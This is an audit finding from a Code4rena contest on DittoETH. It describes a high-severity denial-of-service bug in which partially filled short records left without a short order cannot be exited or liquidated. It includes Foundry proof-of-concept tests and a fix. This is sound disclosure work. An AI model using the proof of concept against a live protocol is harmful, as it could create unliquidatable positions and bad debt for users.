---
tags:
  - lang/solidity
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - sector/lending
  - sector/oracle
protocol: "[[DittoETH]]"
auditors:
  - "[[0xbepresent]]"
report: "https://code4rena.com/reports/2024-03-dittoeth"
genome:
  - "[[liquidation-logic]]"
  - "[[permanent]]"
  - "[[dos-resistance]]"
  - "[[liquidation-underwater]]"
  - "[[timestamp-dependence]]"
---
# [H-04] Partially filled Short Records created without a short order cannot be liquidated and exited

- id: 34174
- impact: HIGH
- protocol: [[DittoETH]]
- reporter: 0xbepresent (Code4rena)
- source: https://code4rena.com/reports/2024-03-dittoeth

## Summary


This bug report discusses an issue in the `sellMatchAlgo()` function loop of the code, where the Short Order is not added to the market every time the Short Record is partially filled. This can prevent users from exiting a Short Record position or liquidating it. The bug also allows for the creation of Short Records with less ERC debt than the minimum required. The report provides a proof of concept and a list of impacted features.

## Details


When a Short Order is being created it tries to fill its Short Record. If it fills the Short Record, the Short Record is given a filled status (`SR.FullyFilled`) and the Short Order isn't added to the market. But if it doesn't fill the Short Record, it is given a partially filled status (`SR.PartiallyFilled`) and the remaining part of the Short Order is added to the market.

The issue is the current implementation doesn't add the Short Order to the market every time the Short Record is partially filled. It does this in the `sellMatchAlgo()` function loop when it tries to match bids.

[LibOrders.sol#L591-L597](https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/libraries/LibOrders.sol#L591-L597)

```solidity
❌                       matchIncomingSell(asset, incomingAsk, matchTotal);
❌                       if (incomingAsk.ercAmount.mul(incomingAsk.price) >= minAskEth) {
                            addSellOrder(incomingAsk, asset, orderHintArray);
                        }
                        s.bids[asset][C.HEAD].nextId = C.TAIL;
                        return;
```

When the Short Order is being matched in the `sellMatchAlgo()` loop, it encounters the check in the `if` statement above. If the value of the erc remaining in the short is less than `minAskEth` it is not added to the market. The Short Record is already given the `SR.PartiallyFilled` status before the check.

When this happens, the Short Record is created with no associated Short Order. This prevents the user from exiting the Short Record and a liquidator from liquidating the position if it ever becomes liquidatable. These actions revert with `InvalidShortOrder()` error in the following portion of the code.

### Exiting

When a user tries to exit using any of the exit functions, he has to pass a Short Order id.

[ExitShortFacet.sol#L41](https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/ExitShortFacet.sol#L41)

```solidity
    function exitShortWallet(
     address asset, 
     uint8 id, 
     uint88 buybackAmount, 
❌   uint16 shortOrderId
    )
```

[ExitShortFacet.sol#L87](https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/ExitShortFacet.sol#L87)

```solidity
    function exitShortErcEscrowed(
      address asset, 
      uint8 id, uint88 
      buybackAmount, 
❌    uint16 shortOrderId
    )
```

[ExitShortFacet.sol#L142](https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/ExitShortFacet.sol#L142)

```solidity
     function exitShort(
        address asset,
        uint8 id,
        uint88 buybackAmount,
        uint80 price,
        uint16[] memory shortHintArray,
❌       uint16 shortOrderId
    )
```

Since there is no valid Short Order Id, if he passes any value it reverts when the user tries to exit. Because the id needs to be associated with the `shortRecord` and still be owned by him to pass the checks. `exitShort()` function calls `checkCancelShortOrder()` which will revert in the check below.

[LibSRUtil.sol#L57](https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/libraries/LibSRUtil.sol#L57)

```solidity
    if (shortOrder.shortRecordId != shortRecordId || shortOrder.addr != shorter) revert Errors.InvalidShortOrder();
```

For `exitShortWallet()` and `exitShortErcEscrowed()`, they revert in the check below when they call `checkShortMinErc()`.

[LibSRUtil.sol#L84](https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/libraries/LibSRUtil.sol#L84)

```solidity
    if (shortOrder.shortRecordId != shortRecordId || shortOrder.addr != shorter) revert Errors.InvalidShortOrder();
```

### Liquidation

The primary and secondary liquidation calls require a Short Order Id.

Primary Liquidation call:

[PrimaryLiquidationFacet.sol#L47](https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/PrimaryLiquidationFacet.sol#L47)

```solidity
    function liquidate(
      address asset, 
      address shorter, 
      uint8 id, uint16[] memory shortHintArray, 
❌    uint16 shortOrderId
)
```

Secondary Liquidation call:

[SecondaryLiquidationFacet.sol#L39](https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/SecondaryLiquidationFacet.sol#L39)

```solidity
  function liquidateSecondary(
    address asset, 
❌   MTypes.BatchLiquidation[] memory batches, 
    uint88 liquidateAmount, 
    bool isWallet
)
```

`BatchLiquidation` struct:

        struct BatchLiquidation {
            address shorter;
            uint8 shortId;
    ❌      uint16 shortOrderId;
        }

The `liquidate()` function reverts in its call to `checkCancelShortOrder()`. The check below causes the revert, because the id passed by the liquidator needs to be associated with the Short Record and still be owned by the user being liquidated to pass the check.

[LibSRUtil.sol#L57](https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/libraries/LibSRUtil.sol#L57)

    if (shortOrder.shortRecordId != shortRecordId || shortOrder.addr != shorter) revert Errors.InvalidShortOrder();

The `liquidateSecondary()` function uses a loop to complete batch liquidation. In the loop, it first does the check below on each batch element.

[SecondaryLiquidationFacet.sol#L69-L80](https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/SecondaryLiquidationFacet.sol#L69-L80)

```solidity
            bool shortUnderMin;
            if (m.isPartialFill) {
                // Check attached shortOrder ercAmount left since SR will be fully liquidated
                STypes.Order storage shortOrder = s.shorts[m.asset][m.shortOrderId];
❌              shortUnderMin = shortOrder.ercAmount < minShortErc;
❌              if (shortUnderMin) {
                    // Skip instead of reverting for invalid shortOrder
❌                 if (shortOrder.shortRecordId != m.short.id || shortOrder.addr != m.shorter) {
                        continue;
                    }
                }
            }
```

The loop skips liquidating if the Short Record's debt is below the minimum i.e. `shortUnderMin` is true for the passed `shortOrder` and `shortOrder.shortRecordId != m.short.id || shortOrder.addr != m.shorter` evaluates to true since the short order isn't attached to the Short Record.

It reverts in the check below. `liquidateAmount` is the amount the liquidator wants to liquidate and `liquidateAmountLeft` is the amount not liquidated. If only the bad Short Record is in the batch, it reverts. If other Short Records in the batch get liquidated it doesn't revert.

[SecondaryLiquidationFacet.sol#L124](https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/SecondaryLiquidationFacet.sol#L124)

```solidity
        if (liquidateAmount == liquidateAmountLeft) revert Errors.SecondaryLiquidationNoValidShorts();
```

*Note: Secondary Liquidation can still be done in some scenarios check the POC section for more details.*

Apart from the DOS effects above, the issue also lets a user create a Short Record with an erc amount below the `minShortErc`. Check the POC.

### Impact

The issue above has the following effects:

1. Users cannot exit a Short Record Position.
2. Primary Liquidation cannot be done on the Short Record.
3. Secondary Liquidation may not be possible on the Short Record.
4. Allows a user to create a Short Record below `minShortErc`.

### Proof of Concept

The tests can be run in the [Shorts.t.sol](https://github.com/code-423n4/2024-03-dittoeth/blob/main/test/Shorts.t.sol) file.

The POC below consists of 5 tests:

- `test_FailExit()`: Shows how exiting a Short Record can fail.
- `test_CreateShortLessThanMin()`: Shows how a Short Record with less erc debt than the minimum can be created.
- `test_FailPrimaryLiquidation()`: Shows how primary liquidation fails.
- `test_FailSecondaryLiquidation()`: Shows how Secondary liquidation fails.
- `test_PassSecondaryLiquidation()`: Shows how Secondary Liquidation can pass and exposes another bug.

It also contains a utility function for setting up the Short Record, `createPartiallyFilledSR`.

Add this import statement to the top of the [Shorts.t.sol](https://github.com/code-423n4/2024-03-dittoeth/blob/main/test/Shorts.t.sol) file:

`import {STypes, MTypes, O, SR} from "contracts/libraries/DataTypes.sol";`

<details>

```solidity
    // util function and errors used by test
    error InvalidShortOrder();
    error SecondaryLiquidationNoValidShorts();
    function createPartiallyFilledSR(uint amount) public 
      returns (STypes.ShortRecord memory short)
    {
        // get minimum ask
        uint minAskEth = diamond.getAssetNormalizedStruct(asset).minAskEth;

        // The bid is opened with an amount that allows short to be 1 less than
        // the minAskEth.
        fundLimitBidOpt(1 ether, uint88(amount - minAskEth + 1), receiver);
        // open short
        fundLimitShortOpt(1 ether,uint88(amount), sender);
        // get the ShortRecord created
        short = getShortRecord(sender, C.SHORT_STARTING_ID);
        assertTrue(short.status == SR.PartialFill);

        // no short orders
        STypes.Order[] memory shortOrders = getShorts();
        assertEq(shortOrders.length, 0);

        return short;
    }

    function test_FailExit() public {
        // create partially filled SR with no short order
        createPartiallyFilledSR(3000 ether);
        // give sender assets to exit short
        deal(asset, sender, 1000 ether);
        // cannot exit the SR
        vm.expectRevert(InvalidShortOrder.selector);
        exitShortWallet(C.SHORT_STARTING_ID, 1000 ether, sender);
    }

    function test_CreateShortLessThanMin() public {
        // create partially filled SR with no short order
        STypes.ShortRecord memory short = createPartiallyFilledSR(2000 ether);
        uint minShortErc = diamond.getAssetNormalizedStruct(asset).minShortErc;
        // created SR has less than minShortErc 
        assertGt(minShortErc, short.ercDebt);
    }

    function test_FailPrimaryLiquidation() public {
        // create partially filled SR with no short order
        createPartiallyFilledSR(3000 ether);

        // change price to let short record be liquidatable
        uint256 newPrice = 1.5 ether;
        skip(15 minutes);
        ethAggregator.setRoundData(
            92233720368547778907 wei, int(newPrice.inv()) / ORACLE_DECIMALS, block.timestamp, block.timestamp, 92233720368547778907 wei
        );
        fundLimitAskOpt(1.5 ether, 2000 ether, receiver); // add ask to allow liquidation have a sell
        // liquidation reverts 
        vm.expectRevert(InvalidShortOrder.selector);
        diamond.liquidate(asset, sender, C.SHORT_STARTING_ID, shortHintArrayStorage, 0);
    }

    function test_FailSecondaryLiquidation() public {
        // create partially filled SR with no short order
        STypes.ShortRecord memory short = createPartiallyFilledSR(3000 ether);
        // change price to let short record be liquidatable
        uint256 newPrice = 1.5 ether;
        skip(15 minutes);
        ethAggregator.setRoundData(
            92233720368547778907 wei, int(newPrice.inv()) / ORACLE_DECIMALS, block.timestamp, block.timestamp, 92233720368547778907 wei
        );

        // give receiver assets to complete liquidation
        deal(asset, receiver, short.ercDebt);
        // create batch
        MTypes.BatchLiquidation[] memory batch = new MTypes.BatchLiquidation[](1);
        batch[0] = MTypes.BatchLiquidation(sender, C.SHORT_STARTING_ID, 0);
        vm.prank(receiver);
        // cannot liquidate
        vm.expectRevert(SecondaryLiquidationNoValidShorts.selector);
        diamond.liquidateSecondary(asset, batch, short.ercDebt, true); 
    }

    // This shows that secondary liquidation can still occur
    function test_PassSecondaryLiquidation() public {
        // create partially filled SR with no short order
        STypes.ShortRecord memory short = createPartiallyFilledSR(3000 ether);
        // change price to let short record be liquidatable
        uint256 newPrice = 1.5 ether;
        skip(15 minutes);
        ethAggregator.setRoundData(
            92233720368547778907 wei, int(newPrice.inv()) / ORACLE_DECIMALS, block.timestamp, block.timestamp, 92233720368547778907 wei
        );

        // create another short for sender
        // the id of this short can be used for liquidation
        fundLimitShortOpt(1 ether, 3000 ether, sender);
        STypes.Order[] memory shortOrders = getShorts();
        shortOrders = getShorts();

        // give receiver assets to complete liquidation
        deal(asset, receiver, short.ercDebt);
        // create batch
        MTypes.BatchLiquidation[] memory batch = new MTypes.BatchLiquidation[](1);
        batch[0] = MTypes.BatchLiquidation(sender, C.SHORT_STARTING_ID, shortOrders[0].id);
        vm.prank(receiver);
        // successful liquidation
        diamond.liquidateSecondary(asset, batch, short.ercDebt, true); 
    }
```

</details>

### Recommended Mitigation Steps

Consider setting `ercAmount` of the `incomingAsk` to zero in the `sellMatchAlgo()` function. This will allow the `matchIncomingSell()` call to set the Short Record to a Fully Filled state.

[LibOrders.sol#L590-L598](https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/libraries/LibOrders.sol#L590-L598)

```solidity
                    if (startingId == C.TAIL) {
-                        matchIncomingSell(asset, incomingAsk, matchTotal);

                        if (incomingAsk.ercAmount.mul(incomingAsk.price) >= minAskEth) {
                            addSellOrder(incomingAsk, asset, orderHintArray);
                        }
+                       incomingAsk.ercAmount = 0;
+                       matchIncomingSell(asset, incomingAsk, matchTotal);
                        s.bids[asset][C.HEAD].nextId = C.TAIL;
                        return;
                    }
```

### Assessed type

DoS

**[ditto-eth (DittoETH) confirmed and commented](https://github.com/code-423n4/2024-03-dittoeth-findings/issues/133#issuecomment-2043261948):**
 > Great find, POC very helpful.

***
